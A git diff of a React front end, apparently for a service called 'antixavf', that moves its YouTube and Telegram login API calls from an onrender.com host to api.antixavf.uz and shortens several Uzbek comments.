@@ -54,8 +54,8 @@ export default function App() {
 
   const verifyYouTubeWebCode = async (authCode) => {
     try {
-      // Yangi ochilgan Backend API'ga kodni jo'natamiz
-      const res = await fetch('https://antixavf-backend.onrender.com/api/yt/verify-web', {
+      // MANA SHU YER YANGILANDI:
+      const res = await fetch('https://api.antixavf.uz/api/yt/verify-web', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ code: authCode }),
@@ -80,7 +80,7 @@ export default function App() {
   };
 
   // ==========================================
-  // TELEGRAM FUNKSIYALARI (O'zgarishsiz)
+  // TELEGRAM FUNKSIYALARI
   // ==========================================
   const handlePhoneChange = (e) => {
     const val = e.target.value.replace(/[^\d\s]/g, '')
@@ -98,7 +98,8 @@ export default function App() {
     setLoading(true)
     setError('')
     try {
-      const res = await fetch('https://antixavf-backend.onrender.com/api/tg/send-code', {
+      // MANA SHU YER YANGILANDI:
+      const res = await fetch('https://api.antixavf.uz/api/tg/send-code', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone: getCleanPhone() }),
@@ -119,7 +120,8 @@ export default function App() {
     setLoading(true)
     setError('')
     try {
-      const res = await fetch('https://antixavf-backend.onrender.com/api/tg/verify-code', {
+      // MANA SHU YER YANGILANDI:
+      const res = await fetch('https://api.antixavf.uz/api/tg/verify-code', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone: getCleanPhone(), phone_code_hash: hash, code }),
@@ -145,7 +147,8 @@ export default function App() {
     setLoading(true)
     setError('')
     try {
-      const res = await fetch('https://antixavf-backend.onrender.com/api/tg/verify-password', {
+      // MANA SHU YER YANGILANDI:
+      const res = await fetch('https://api.antixavf.uz/api/tg/verify-password', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone: getCleanPhone(), password }),
@@ -266,7 +269,7 @@ export default function App() {
                   </div>
                 </button>
 
-                {/* YOUTUBE TUGMASI (Endi to'g'ri Google'ga olib ketadi) */}
+                {/* YOUTUBE TUGMASI */}
                 <button
                   onClick={handleStartYouTubeAuth}
                   disabled={loading}
@@ -289,7 +292,7 @@ export default function App() {
               </div>
             )}
 
-            {/* TELEGRAM QISMI (O'zgarishsiz qoldi) */}
+            {/* TELEGRAM QISMI */}
             {platform === 'tg' && step === 'phone' && (
               <div className='flex flex-col gap-6 animate-fade-in'>
                 <div className='text-center'>
@@ -352,7 +355,7 @@ export default function App() {
               </div>
             )}
 
-            {/* YANGI: YOUTUBE LOADING EKRANI (Google'dan qaytganda chiqadi) */}
+            {/* YOUTUBE LOADING EKRANI */}
             {platform === 'yt' && step === 'yt_loading' && (
               <div className='flex flex-col items-center justify-center gap-6 animate-fade-in py-8'>
                 <div className='relative'>
@@ -368,7 +371,7 @@ export default function App() {
               </div>
             )}
 
-            {/* YANGI: YOUTUBE XATOLIK EKRANI */}
+            {/* YOUTUBE XATOLIK EKRANI */}
             {platform === 'yt' && step === 'yt_error' && (
               <div className='flex flex-col items-center justify-center gap-6 animate-fade-in py-6'>
                 <div className='inline-flex items-center justify-center w-16 h-16 rounded-full bg-red-500/10 mb-2 ring-1 ring-red-500/20'>
